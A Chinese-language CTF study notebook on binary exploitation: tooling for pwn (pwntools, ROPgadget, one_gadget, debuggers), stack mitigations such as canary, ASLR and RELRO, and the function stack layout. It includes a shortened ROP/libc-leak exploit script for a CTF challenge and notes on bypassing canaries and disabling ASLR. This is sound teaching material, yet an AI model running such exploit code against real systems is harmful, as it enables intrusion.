contact: hexhex16@outlook.com  recommended viewer/editor: Typora

- 未加说明时，默认系统为kali 20.04(64bit), python3.7或以上, 其余套件为2021前后的最新版
- 部分内容与 Reverse.md, Binary.md 有重叠/交叉，动态调试、汇编指令、机器码优先记录在 Reverse.md；二进制文件格式，编译链接过程，调用规范记录在Binary.md 

# Pwn

> spelled "pone". like "p" own
>
> pwn的源起以及被广泛地普遍使用的原因：魔兽争霸某段讯息上设计师打字时拼错，原本应是own。 'p' 与 'o' 在标准英文键盘上位置相邻

- pwn是一个骇客语法的俚语词，自"own"这个字引申出来的
- 在计算机技术领域，pwn一般指攻破(to compromise, 危及, 损害)，或是控制(to control)



- vulnerability: 脆弱性，计算机安全隐患，易损点，弱点。

```cpp
_rdtsc() // 检测程序运行需要多少个CPU周期
```



> # Resources
>
> https://hackmd.io/@u1f383/pwn-cheatsheet
>
> 

## checksec

> https://github.com/slimm609/checksec.sh

`checksec` Installation

- 实际上pwntools已经包含`checksec`, 如果不起作用是因为不在PATH中，'/home/kali/.local/bin' which is not on PATH，在安装完pwntools时会有这个warning提示
- includes checksec: e.g. miniconda3, pwntools

```bash
git clone https://github.com/slimm609/checksec.sh
cd checksec.sh
chmod 777 ./checksec
env | grep PATH # 查看系统路径包含哪些
sudo cp ./checksec /usr/bin # 这里的路径是上面 PATH 中出现的其中一个 # 只要是 PATH 中出现过的路径都可以
```

```bash
checksec filename  # 使用方法（旧版）
checksec --file=filename  # 新版
```



## one\_gadget

> https://github.com/david942j/one_gadget

- Installation: 

```bash
sudo apt install ruby -y
sudo gem install one_gadget # gem: ruby 包管理
one_gadget libc-2.27.so
one_gadget libc-2.27.so --near exit,mkdir # Reorder gadgets according to the distance of given functions.
one_gadget /lib/x86_64-linux-gnu/libc.so.6 --near 'write.*' --raw # Regular expression is acceptable.
one_gadget /lib/x86_64-linux-gnu/libc.so.6 --near spec/data/test_near_file.elf --raw # Pass an ELF file as the argument, OneGadget will take all GOT functions for processing.
```



```python
import subprocess
def one_gadget(filename):
	return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

one_gadget('/lib/x86_64-linux-gnu/libc.so.6')
#=> [324293, 324386, 1090444]
```





## gef

> gef github:   https://github.com/hugsy/gef 
>
> 切换pwndbg,peda,gef:    https://www.jianshu.com/p/94a71af2022a

- `GEF` (pronounced ʤɛf - "Jeff") is a set of commands for x86/64, ARM, MIPS, PowerPC and SPARC to assist exploit developers and reverse-engineers when using old school GDB. It provides additional features to GDB using the Python API to assist during the process of dynamic analysis and exploit development.
- Installation:
  1. 访问 http://gef.blah.cat/py  ，将其内容保存到文件`~/.gdbinit-gef.py`中
  2. `echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit`. 

- 使用gef:  `echo "source ~/.gdbinit-gef.py" >> ~/.gdbinit`, 然后`~/.gdbinit`内容如下，gdb启动后为使用gef，显示`gef➤ `

```bash
source /home/kali/.gdbinit-gef.py
```





## pwndbg

> https://github.com/pwndbg/pwndbg
>
> https://blog.csdn.net/Breeze_CAT/article/details/103789233  指令参考

Installation:

1. `git clone https://github.com/pwndbg/pwndbg`
2. `cd pwndbg`
3. `chmod 777 ./setup.sh`
4. `./setup.sh`

- 安装完成后，使用`gdb`指令后，命令行左侧显示的是`pwndbg`

> 如何使用pwndbg见 Reverse.md. Dynamic Analysis: pwndbg
>
> 实践使用案例见对应writeup

- 在显示stack的时候 中间会有省略 暂时不知道有什么方法能去掉中间省略的部分，有时会影响栈分析，考虑换用gef



## pwntools

> python包    Github repo: https://github.com/Gallopsled/pwntools
>
> docs: https://docs.pwntools.com/en/latest/

- pwn工具集. `pwntools` is a CTF framework and exploit development library. CTF框架，python包
- WARNING: 网上很多使用pwntools的脚本是基于python2的，需要注意str byte转换，以及可能存在的API名称/行为改变。pwntools会顺带安装很多有用的工具如checksec 放在 /home/kali/.local/bin ，要添加到PATH，安装pwntools后会有warning提示

```python
from pwn import *
context.log_level = "DEBUG"
context.binary = ""./pwny" # print(context)

# ===== 连接
sh = remote("127.0.0.1", 32152) # 与互联网主机交互
sh = process("./bin", shell=True) # 启动本地程序进行交互，用于gdb调试
sh = process("./bin")  # , env={'LD_PRELOAD': './libc.so.6'}
# process(['ld.so','pwn'],env=xxx)


# =====elf 
libc = ELF("./libc.so.6")
elf = ELF("./login")


# ===== 发送
sh.send("hello") # 不会添加回车
sh.sendline("hello") # sendline发送数据会在最后多添加一个回车
sh.sendafter(">", payload) # 在接收到 > 后发送


# ===== 接收
sh.recv(1024) # 读取1024个字节

sh.recvuntil() # 读取一直到回车
sh.recvuntil("end\n") # 读取一直到 end\n
sh.recvuntil(b' ', drop=True) # b'331'

sh.recvline()
sh.recvline(timeout=1) # 超时为1s
sh.recvline("hello") # 读取到指定数据
sh.recvline(keepends=False) # 不保存尾部截断字符

sh.interactive()
```



```python
sh.p32(0xdeadbeef)
sh.p64(0xdeadbeefdeadbeef)
sh.u32("1234")
sh.u64("12345678")
# 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword
addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0')) # 64bit OS接收函数地址 补全 转换

import struct
p32(0xdeadbeef) == struct.pack('I', 0xdeadbeef) # True # 两者等效
leet = unhex('37130000')
u32(b'abcd') == struct.unpack('I', b'abcd')[0] # True # 两者等效
u8(b'A') == 0x41 # True # 两者等效
```

- Installation: 

> (2021.3) 官方文档建议使用python3

```bash
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```



> https://docs.pwntools.com/en/latest/intro.html
>
> 使用`from pwn import *`后，quick list of most of the objects and routines imported: https://docs.pwntools.com/en/latest/globals.html



### Target Architecture, OS, Logging, Assembly, ELF

```python
asm('nop') # b'\x90'
asm('nop', arch='arm') # b'\x00\xf0 \xe3'
# set once in the global `context`
context.arch      = 'i386'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 32
```

```python
# asm context 方法对比
asm('nop') # b'\x90'
context(arch='arm', os='linux', endian='big', word_size=32)
asm('nop') # b'\xe3 \xf0\x00'
```

```python
# set logging level
context.log_level = 'debug'
log.success("ret_addr:" + hex(ret_addr)) # success logging 
```

> `pwnlib.asm`

```python
enhex(asm('mov eax, 0')) # 'b800000000'  # assembly to machine code # 汇编转机器码(hex)
print(disasm(unhex('6a0258cd80ebf9'))) # machine code to readable assembly
# Output: 
   0:   6a 02                   push   0x2
   2:   58                      pop    eax
   3:   cd 80                   int    0x80
   5:   eb f9                   jmp    0x0
```



```python
e = ELF('/bin/cat')
print(hex(e.address)) #doctest: +SKIP # 0x400000
print(hex(e.symbols['write'])) #doctest: +SKIP # 0x401680
print(hex(e.got['write'])) #doctest: +SKIP # 0x60b070
print(hex(e.plt['write'])) #doctest: +SKIP # 0x401680

# patch and save the files # 打补丁并保存
e = ELF('/bin/cat')
e.read(e.address, 4) # b'\x7fELF'
e.asm(e.address, 'ret') # 将 e.address 地址处的汇编改为 ret
e.save('/tmp/quiet-cat')
disasm(open('/tmp/quiet-cat','rb').read(1))
'   0:   c3                      ret'
```



### Cases

> 这里列举的代码通常去掉了很多功能重复的语句，一般无法直接运行也无法解题

```python
from pwn import *   # ROP_double_leave_tiny_rop_GKCTF2021_checkin # truncated

context.log_level = "DEBUG"
context.binary = "./pwn"
# sh = process(["ld.so", "pwn"], env={"LD_PRELOAD":"libc.so"})
# sh = process("./pwn", env={"LD_PRELOAD": "./libc.so.6"})
# sh = process(["ld.so", "pwn"],env=xxx)
sh = remote("node3.buuoj.cn", 27490)
libc = ELF("./libc.so.6")
elf = ELF("./pwn")
gdb.attach(sh, "b *(0x401972)\nb *(0x40191C)\nc")
#gdb.attach(sh, "b *$rebase(0x0000000000000F43)")
payload = b"admin\0".ljust(0x8, b'\0') + p64(0x401ab3) + p64(elf.got['puts']) + p64(0x4018B5)
sh.sendafter(">", payload)

data = sh.recvuntil("GeBai\n")
addr_puts = u64(sh.recvline(keepends=False).ljust(8, b'\0')) # 注意这里接收64bit系统函数地址后的操作
libc.address = addr_puts - libc.sym['puts']
print("libc.address =", hex(libc.address))

payload = b"admin\0".ljust(0x18, b'\0') + p64(libc.address + 0xf1247) # one_gadget: 0x45226 0x4527a 0xf03a4 0xf1247
sh.sendafter(">", payload)

sh.interactive()
```



### Docker

> https://blog.csdn.net/Huangshanyoumu/article/details/115037413 docker安装+换源

```bash
sudo docker pull pwntools/pwntools:stable # Download the Docker image
sudo docker run -it pwntools/pwntools:stable # Boot the image
```





## ROPgadget

> https://github.com/JonathanSalwan/ROPgadget
>
> ROPgadget v6.5 installation test on Kali 20.04, 2021.3

```bash
sudo pip install capstone
pip install ropgadget
# 添加至$PATH :  
# /usr/local/lib/python3.9/dist-packages/bin # 路径的可能值
# /home/kali/.local/bin/ROPgadget
ROPgadget --help # 选项及使用案例
ROPgadget -v
Version:        ROPgadget v6.5 # 测试时的最新版
Author:         Jonathan Salwan
Author page:    https://twitter.com/JonathanSalwan
Project page:   http://shell-storm.org/project/ROPgadget/

ROPgadget.py [-h] [-v] [-c] [--binary <binary>] [--opcode <opcodes>]
                    [--string <string>] [--memstr <string>] [--depth <nbyte>]
                    [--only <key>] [--filter <key>] [--range <start-end>]
                    [--badbytes <byte>] [--rawArch <arch>] [--rawMode <mode>]
                    [--rawEndian <endian>] [--re <re>] [--offset <hexaddr>]
                    [--ropchain] [--thumb] [--console] [--norop] [--nojop]
                    [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]
                    [--dump] [--silent] [--align ALIGN]
```



```bash
ROPgadget --binary ret2baby  --only 'pop|ret' | grep 'eax' # 寻找控制 eax 的 gadgets
ROPgadget --binary ret2baby  --only "int" # 找 int xxx 的地址
ROPgadget --binary ret2baby  --string "/bin/sh" # 获得 /bin/sh 字符串对应的地址

```



## libcsearcher

```python
from LibcSearcher import *
libc = LibcSearcher("gets",gets_real_addr)
libcbase = gets_real_addr – obj.dump("fgets")
system_addr = libcbase + obj.dump("system") # system 偏移
bin_sh_addr = libcbase + obj.dump("str_bin_sh") # /bin/sh 偏移
```



## seccomp

规则一旦被set，后续不可通过重复set来取消之前的规则。

```bash
sudo apt install gcc ruby-dev
sudo apt install libseccomp-dev libseccomp2 seccomp
sudo gem install seccomp-tools
sudo seccomp-tools dump "./ld-2.23.so ./pwn"
```



# Anti-Pwn

反调试：alarm 程序超时抛出SIGALRM退出。会影响本地调试，替换成isnan函数：`sed -i s/alarm/isnan/g ./ProgrammName`



## Canary

> 栈的警惕标志 stack canary  编译器层级  栈保护  对应Windows 下的 GS 保护
>
> 金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的，预警用的金丝雀
>

- 在栈的返回地址之前放置一个整形值，该值在装入程序时随机确定。栈缓冲区攻击时从低地址向高地址覆盖栈空间，因此会在覆盖返回地址之前就覆盖了警惕标志。返回前会检查该警惕标志是否被篡改，判断 stack/buffer overflow 是否发生
- canary最低地址处的1B为`0x00`，为了截断栈上的字符串输出

开启canary后的栈空间，从高地址往低地址：

```assembly
arg2       # 2nd function arguments 
arg1       # 1st function arguments 
return addr  # <== RA  rbp + 8 (+8 for 64bit OS)
rbp        # <== rbp 栈底
canary     # <== rbp - 8  <== canary canary canary canary canary canary canary
local_buf  # 函数的局部变量，包括函数内声明的 char[] int float ....
```



开启了canary的 linux x86-64 的汇编代码

```assembly
mov     rax, fs:28h  ; 紧跟在函数序言之后，将 fs:28h 处的值取出来作为canary
mov     [rbp+var_8], rax ; 将canary保存到 rbp-8 的位置   ; var_8 = qword ptr -8
... ; main logic of this function
mov     rax, [rbp+var_8] ; 从栈上 rbp-8 取出栈上现在的canary值
xor     rax, fs:28h ; 将栈上的canary与 fs:28h 处的值做异或（对比是否相等）
jz      short locret_400759 ; 如果相等则跳到后面区执行
call    ___stack_chk_fail ; 如果不相等就会执行这条 call 调用libc的 ___stack_chk_fail 输出异常并退出
call   0x400460 <__stack_chk_fail@plt> ; 这是开启了PIE后的
```

canary校验失败时调用位于 glibc 的 `__stack_chk_fail`，该函数默认经过 ELF 的延迟绑定，`__stack_chk_fail`定义: 

```c
// eg libc-2.19/debug/stack_chk_fail.c
void __attribute__ ((noreturn)) __stack_chk_fail (void){
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg){
  /* The loop is added only to keep gcc happy.  */  　// ???????
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>");
}
```

可以通过劫持 `__stack_chk_fail` 的 got 值劫持流程或者利用 `__stack_chk_fail` 泄漏内容 (参见 stack smash)。



GCC Canary 相关选项：e.g. `gcc -m32 -no-pie -fstack-protector-all ex2.c -o ex2`

```bash
-fstack-protector # 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all # 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit # 只对有明确 stack_protect attribute 的函数开启保护
-fno-stack-protector # 禁用保护
```

> FS寄存器 https://www.cnblogs.com/feiyucq/archive/2010/05/21/1741069.html 所述内容与本节所述的FS寄存器的貌似有些不同？



 Linux 中`fs` 寄存器指向当前栈的 TLS 结构，fs:0x28 指向 stack_guard。

```c
typedef struct{
  void *tcb;   // Pointer to the TCB.  Not necessarily the thread descriptor used by libpthread.
  dtv_t *dtv;
  void *self;  // Pointer to the thread descriptor.
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  ...
} tcbhead_t;
```

如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。

事实上，TLS 中的值由函数 security_init 进行初始化

```c
static void
security_init (void){
  // _dl_random的值在进入这个函数的时候就已经由kernel写入.
  // glibc直接使用了_dl_random的值并没有给赋值
  // 如果不采用这种模式, glibc也可以自己产生随机数

  //将_dl_random的最后一个字节设置为0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);

  // 设置Canary的值到TLS中
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

//THREAD_SET_STACK_GUARD宏用于设置TLS
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)
```





### Canary Bypass

> Canary 绕过

Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。



**Leak Canary**

> 泄露栈中的canary

- Canary 以字节 `\x00` 结尾，本意为截断字符串。则覆盖 Canary 的最低1B，可打印出剩余的 Canary 
- 这种利用方式需要存在合适的输出函数，并且可能需要先溢出泄露 Canary，之后再次溢出控制执行流程
- 在一次运行中，canary的值不变，故可以在一个函数中泄露canary，在另一个函数中使用

**one-by-one 爆破 Canary**

> 逐位爆破canary



**劫持`__stack_chk_fail` 函数**

TBD



**覆盖 TLS 中储存的 Canary 值**

TBD



## NX/DEP

栈不可执行，即栈空间的地址不拥有执行权限。NX需要CPU硬件支持

绕过方式为ROP





## PIE(PIC)

> PIC = Position Independent Code 
>
> -fpic Generate position-independent code (PIC) suitable for use in a shared library
>
> https://zhuanlan.zhihu.com/p/91420787 如何做到PIC (2 parts) 带案例
>
> https://sa.sogou.com/sgsearch/sgs_tc_news.php?req=XJfILdCUU2TuOxZDyaoqZBTGiGQumUZMYP-S-WEG-a0=&user_type=1  这里有详细的利用GOT实现PIC的过程 含图示 TBD
>
> `readelf -l hello | grep LOAD | head -1` 查看Load Address

- PIC: 通过获取当前eip值 + 全局偏移表global offset table（GOT）来实现的

1. 利用`get_pc_trunk`获得当前eip的值，例如将eip存储到eax的`__x86.get_pc_thunk.ax` :

```assembly
call   4f5 <__x86.get_pc_thunk.ax>  # -fpic后的程序调用__x86.get_pc_thunk.ax来获取当前eip
 4f5 <__x86.get_pc_thunk.ax>: # 由于 call指令会 push eip; jmp 4f5; 所以此时esp指向的值就是eip
 4f5:    8b 04 24       mov  (%esp),%eax # 把esp指向的值(RA aka caller eip) 赋值给eax
 4f8:    c3             ret # pop eip, 取的也是RA
```

2. GOT



### PLT and GOT

> the key to code sharing and dynamic libraries. 对代码复用、动态库有关键作用. 运行时重定位
>
> https://www.freebuf.com/articles/system/135685.html Linux中的GOT和PLT到底是个啥？

GOT: Global Offset Table, 全局偏移表。存放**函数地址的数据表**

PLT: Procedure Linkage Table, 程序链接表。**额外代码段**表

动态链接所需要的：

- 需要存放外部函数的数据段（GOT）
- 获取数据段存放函数地址的一小段额外代码（PLT）

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/pwn_PLT_GOT_very_simple_illustration.jpg)





## ASLR

> 地址空间配置随机加载  Address Space Layout Randomization  地址空间配置随机化  地址空间布局随机化
>
> OS层级的保护
>

- ASLR通过**随机放置进程关键数据区域的地址空间**来防止攻击者能可靠地跳转到内存的特定位置来利用函数。现代操作系统一般都加设这一机制，以防范恶意程序对已知地址进行**Return-to-libc**攻击
- ASLR 的有效性依赖于整个地址空间布局是否对于攻击者保持未知。只有编译时作为 位置无关可执行文件(Position Independent Executable) **PIE** 的可执行程序才能得到 ASLR 技术的最大保护，因为只有这样，可执行文件的所有代码节区才会被加载在随机地址。PIE 机器码不管绝对地址是多少都可以正确执行。



ASLR绕过方法：

- 利用地址泄露
- 访问与特定地址关联的数据
- 针对 ASLR 实现的缺陷来猜测地址，常见于系统熵过低或 ASLR 实现不完善。
- 利用侧信道攻击



修改`/proc/sys/kernel/randomize_va_space`来控制ASLR启动与否，具体选项：

- 0: 关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同
- 1: 普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化
- 2: 增强的 ASLR，在 1 的基础上，增加了堆基地址随机化







### Settings

查看ASLR是否开启

```bash
$ cat /proc/sys/kernel/randomize_va_space
2
$ sysctl -a --pattern randomize
kernel.randomize_va_space = 2
```

关闭ASLR

```bash
echo 0 > /proc/sys/kernel/randomize_va_space # 关闭Linux系统的ASLR
sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space" # kali20.04测试时需用
# Output redirection (via the > operator) is done by the shell, not by echo.
sudo sysctl -w kernel.randomize_va_space=0    <== disable
```


关闭ASLR时，两次ldd的输出值一样。`ldd` 命令会加载共享对象并显示它们在内存中的地址。但是开启ASLR后，每次ldd的输出都不通

```bash
kernel.randomize_va_space = 0 # 关闭了ASLR
$ ldd /bin/bash
        linux-vdso.so.1 (0x00007ffff7fd1000) # same addresses
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007ffff7c69000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7c63000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a79000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd3000)
$ ldd /bin/bash
        linux-vdso.so.1 (0x00007ffff7fd1000) # same addresses
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007ffff7c69000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7c63000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7a79000)
        /lib64/ld-linux-x86-64.so.2 (0x00007ffff7fd3000)
```

```bash
kernel.randomize_va_space = 2 # 开启增强的ASLR
$ ldd /bin/bash
        linux-vdso.so.1 (0x00007fff47d0e000) # first set of addresses
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f1cb7ce0000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f1cb7cda000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1cb7af0000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f1cb8045000)
$ ldd /bin/bash
        linux-vdso.so.1 (0x00007ffe1cbd7000) # second set of addresses
        libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007fed59742000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fed5973c000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fed59552000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fed59aa7000)
```







## RELRO

> Relocation Read-Only
>
> 编译器层级的保护
>
> https://blog.csdn.net/ylcangel/article/details/102625948

- a security measure which makes some binary sections read-only
- 默认情况下应用程序的导入函数只有在调用时才去执行加载（所谓的懒加载，非内联或显示通过dlxxx指定直接加载），如果让这样的数据区域属性变成只读将大大增加安全性
- RELRO是一种用于加强对 binary 数据段的保护的技术，大概实现由linker指定binary的一块经过dynamic linker处理过relocation之后的区域为只读，设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT攻击

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/RELRO_Comparison.png)

有三种状态：

1. 不开启RELRO
2. 部分RELRO
3. 完全RELRO

```bash
gcc -o test test.c # 默认情况下，是Partial RELRO
gcc -z norelro -o test test.c # 关闭，即No RELRO
gcc -z lazy -o test test.c # 部分开启，即Partial RELRO
gcc -z now -o test test.c # 全部开启，即Full RELRO
```



Partial RELRO: 现在gcc 默认编译就是 partial relro

1. some sections(.init_array .fini_array .jcr .dynamic .got) are marked as read-only after they have been initialized by the dynamic loader
2. non-PLT GOT is read-only (.got)
3. GOT is still writeable (.got.plt)

Full RELRO: 

1. 拥有 Partial RELRO 的所有特性
2. lazy resolution 是被禁止的，所有导入的符号都在 startup time 被解析
3. bonus: the entire GOT is also (re)mapped as read-only or the .got.plt section is completely initialized with the final addresses of the target functions (Merge .got and .got.plt to one section .got). Moreover, since lazy resolution is not enabled, the GOT[1] and GOT[2] entries are not initialized. GOT[0] is a the address of the module’s DYNAMIC section. GOT[1] is the virtual load address of the link_map, GOT[2] is the address for the runtime resolver function。

---

# The Function Stack

> 函数调用栈
>
> related registers: ESP, EBP, EIP...            
>
> https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html

Procedure of `call tag`:

1. `push IP`: 将当前的IP(a.k.a.函数返回地址)入栈. a.k.a ESP/RSP 减 4/8; IP写到ESP/RSP存的指针所指向的内存中。
2. `jmp tag`: a.k.a `jmp dword ptr 内存单元地址`。

`ret`指令相当于`pop IP`, CPU在执行`ret`指令时只需要恢复IP。从栈指针ESP/RSP/SP指向的内存中读取数据，(通常)写到其他寄存器里，然后将栈指针esp/rsp加上4/8

32bit系统：

- ESP: 栈指针寄存器(extended stack pointer), ESP永远指向系统栈最上面一个栈帧的栈顶(低地址)。注意指向的是**栈顶元素的地址**，而**不是下一个空闲地址**。ESP寄存器是固定的，只有当函数的调用后，发生入栈操作而改变。通常情况下ESP是可变的，随着栈的生产而逐渐变小，用EBP来标记栈的底部
- EBP: 基址指针寄存器(extended base pointer), EBP永远指向系统栈最上面一个栈帧的底部(高地址)。

intel系统中栈是向下生长的(栈越扩大其值越小,堆恰好相反)

通过固定的地址与偏移量来寻找在栈参数与变量，EBP寄存器存放的就是固定的地址。但是这个值在函数调用过程中会变化，函数执行结束后需要还原，因此要在函数的出栈入栈中进行保存

## Push Order

> 入栈顺序

以**Windows/Intel**为例，通常当函数调用发生时，数据将以以下方式存储在栈中：

1. **函数参数从右往左入栈**。The function parameters are pushed on the stack before the function is called. The parameters are pushed from right to left.
2. **x86 call**指令将**返回地址**入栈，返回地址存储的是**当前EIP寄存器的值**。The function **return address** is placed on the stack by the x86 CALL instruction, which stores the current value of the EIP register.
3. caller的**栈帧基址EBP**入栈。Then, the frame pointer that is the previous value of the EBP register is placed on the stack.
4. 如果函数有try/catch或其他**异常处理结构**，编译器会将异常处理信息入栈。If a function includes try/catch or any other exception handling construct such as SEH (Structured Exception Handling - Microsoft implementation), the compiler will include exception handling information on the stack.
5. **局部声明的变量**。Next, the locally declared variables.
6. 将缓冲区分配给**临时数据**存储。Then the buffers are allocated for temporary data storage.
7. 存储在callee会被使用的**寄存器**（对于**Linux/intel，该步在Step 4 后**，局部声明变量前）。Finally, the callee save registers such as ESI, EDI, and EBX are stored if they are used at any point during the functions execution. For Linux/Intel, this step comes after step no. 4. 

**Linux/Intel 入栈顺序**：

1. **实参N\~1**
2. **返回地址**，当前EIP寄存器的值
3. caller帧基指针**EBP**
4. 异常处理信息
5. callee中会用到的**寄存器**
6. callee**局部变量1\~N**

## Memory Layout

> 内存布局

- 函数调用栈的典型内存布局（Linux/Intel, x86-32bit）如下所示。包含caller和callee，包含寄存器和临时变量的栈帧布局。注意这里的Called-saved Registers的位置是**Linux/Intel**的

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/pwn_function_stack_caller_and_callee.jpg)

- `m(%ebp)`表示以EBP为基地址、偏移量为m字节的内存空间(中的内容)
- 该图基于两个假设：第一，函数返回值不是结构体或联合体，否则第一个参数将位于`12(%ebp)` 处；第二，每个参数都是4字节大小(栈的粒度为4字节)
- 函数可以没有参数和局部变量，故图中“Argument(参数)”和“Local Variable(局部变量)”不是函数栈帧结构的必需部分



- 结构体成员变量的入栈顺序与其在结构体中声明的顺序相反
- **局部变量的布局依赖于编译器实现等因素。局部变量并不总在栈中，有时出于性能(速度)考虑会存放在寄存器中**。
- 数组/结构体型的局部变量通常分配在栈内存中

> 局部变量以何种方式布局并未规定。编译器计算函数局部变量所需要的空间总数，并确定这些变量存储在寄存器上还是分配在程序栈上(甚至被优化掉)——某些处理器并没有堆栈。局部变量的空间分配与主调函数和被调函数无关，仅仅从函数源代码上无法确定该函数的局部变量分布情况。
>
> 基于不同的编译器版本(gcc3.4中局部变量按照定义顺序依次入栈，gcc4及以上版本则不定)、优化级别、目标处理器架构、栈安全性等，相邻定义的两个变量在内存位置上可能相邻，也可能不相邻，前后关系也不固定。若要确保两个对象在内存上相邻且前后关系固定，可使用结构体或数组定义



**Examples**

> https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html

- 许多编译器使用帧指针（FP，Frame Pointer）来引用局部变量和参数，FP的值不随push, pop改变。在Intel cpu上，EBP用作FP

```cpp
#include <stdio.h>  // https://www.tenouk.com/Bufferoverflowc/Bufferoverflow2a.html  // 32bit
int MyFunc(int parameter1, char parameter2){ // 取这两个参数时，相对EBP的偏移量为正
	int local1 = 9;
	char local2 = 'Z';
    return 0;
}
int main(int argc, char *argv[]){
	MyFunc(7, '8'); // 参数从右向左压栈，push '8'; push 7 // 然后将EIP入栈，此时EIP指向main函数的下一个要执行的指令，即call指令以后的
	return 0;
}
```

![](https://raw.githubusercontent.com/kokifish/pictures/master/CTF_pic/RE_function_call_function_stack_layout.png)

## x64

> 相信内容见reverse.md中的 *6. printf()函数与参数传递*

- \*nix x64系统先使用**RDI, RSI, RDX, RCX, R8, R9**寄存器传递前6个参数，然后利用栈传递其余的参数
- Win64使用RCX, RDX, R8, R9寄存器传递前4个参数，使用栈来传递其余参数





---

# Linux Pwn





---

## libc / ld Versions

> 记录如何获取对应版本的 libc.so ld.so。docker拉取对应大版本，archive.ubuntu拉取对应小版本

**docker拉取对应大版本**

- 首先需要安装docker，使用`sudo systemctl start docker`启动，`docker version`查看版本。

```bash
# 以拉取ubuntu:16.04的libc, ld为例
sudo docker container run -t -i ubuntu:16.04 /bin/bash # 拉取并运行ubuntu:16.04后进入容器内console
ls /lib/x86_64-linux-gnu/ | grep libc # 查看含libc字样的文件  可看到版本
ls /lib/x86_64-linux-gnu/ | grep ld # 查看含ld字样的文件 可看到版本
# NEW a new console # 接下来在新的terminal执行
sudo docker container ls # 然后在输出中复制 ubuntu:16.04 的 CONTAINER ID
# 复制 ubuntu:16.04 的 /lib/x86_64-linux-gnu/libc-2.23.so 到 /home/kali/libc-2.23.so
sudo docker cp 3198a81a976d:/lib/x86_64-linux-gnu/libc-2.23.so /home/kali/libc-2.23.so 
# 复制 ubuntu:16.04 的 /lib/x86_64-linux-gnu/ld-2.23.so 到 /home/kali/ld-2.23.so
sudo docker cp 3198a81a976d:/lib/x86_64-linux-gnu/ld-2.23.so /home/kali/ld-2.23.so
sudo docker cp ./libc6_2.27-3ubuntu1_i386.deb 934a8c26021e:/root # 把deb复制到docker: /root
```

**archive.ubuntu拉取对应小版本**

> 以找 GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27. 对应的ld.so为例

1. 确定libc.so的具体版本: `strings libc.so.6 | grep GLIBC`

```bash
strings libc.so.6 | grep GLIBC # 最后一行显示glibc的具体版本
# GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.  # 最后一行显示的内容
```

2. 然后在 http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/  找到 **libc6_2.27-3ubuntu1_i386.deb**  下载下来

> 注意不能下 libc6-amd64_2.27-3ubuntu1_i386.deb，也不要下成source，dev dbg等也不行，更不要小版本错误。libc-bin 就没有bin (指ld.so)
> It doesn't work. why? libc6_2.27-3ubuntu1_i386.deb work, why? how it works?

3. 提取 deb 里面的文件到文件夹 extr: `sudo dpkg -X libc6_2.27-3ubuntu1_amd64.deb ./extr`
4. `file ./extr/lib/i386-linux-gnu/libc-2.19.so` 查看sha1, 与给出的libc的sha1对比
5. 找到 `ld-2.27.so`: `find ./extr -name "ld*"      # Output: ./extr/lib/x86_64-linux-gnu/ld-2.27.so`
6. 把ld-2.27.so复制到当前目录命名为ld.so: `cp ./extr/lib/x86_64-linux-gnu/ld-2.27.so ./ld.so`
7. 尝试在bash指定libc.so ld.so运行程序

```bash
LD_PRELOAD=./libc.so.6 ./ld.so ./ciscn_final_3 # LD_PRELOAD=./libc.so ./ld.so ./elf
```

